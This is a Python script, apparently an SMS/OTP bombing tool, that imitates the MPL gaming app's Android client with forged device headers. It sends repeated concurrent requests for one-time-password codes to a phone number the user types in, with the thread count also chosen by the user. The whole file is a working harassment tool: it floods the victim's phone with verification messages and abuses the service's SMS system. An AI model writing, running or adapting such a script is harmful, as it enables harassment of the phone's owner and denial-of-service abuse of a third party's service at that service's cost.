import requests, threading


def otp(nomor):
    headers = {
    'Host': 'global-api.mpl.live',
    'language': 'in',
    'user-agent': 'mpl-android/1000153 (RV-153)',
    'apptype': 'Cash',
    'countrycode': 'ID',
    'countrycallingcode': '0',
    'flavorname': 'production_global_nowtm',
    'buildtype': 'false',
    'islogenabled': 'false',
    'isdevelopmentenabled': 'false',
    'versionname': '1.0.153_MPL_Production_ID_nowtm',
    'buildtime': '20211215_11_23',
    'deviceid': 'a4790cc74c2fefda',
    'osversioncode': '29',
    'osversion': '10',
    'make': 'ROG',
    'model': 'NEWS-VERSION',
    'manufacturer': 'ROG',
    'devicearch': 'armv8l',
    'apktype': 'INDO_IA_NWTM_MISSIONS',
    'deviceidnew': 'a4790cc74c2fefda',
    'countrycodenew': 'ID',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    'content-length': '193',
    'accept-encoding': 'gzip',
    }
    data = '{"countryCode":62,"mobileNumber":"' + nomor + '","referrerCode":"","signUpOfferCode":"","imei":{"imei1":"","imei2":""},"gameId":1000002,"ivbb":"","userUid":"a0861be9-9c71-44ae-b9a2-6a63b8edba48"}'
    response = requests.post('https://global-api.mpl.live/auth/init/otp', headers=headers, data=data).text
    print(response)
    
nomor = input('Phone Number (example: 81256281738): ')
thr = int(input('Thread: '))
for i in range(0,thr):
	t = threading.Thread(target=otp, args=[nomor])
	t.start()
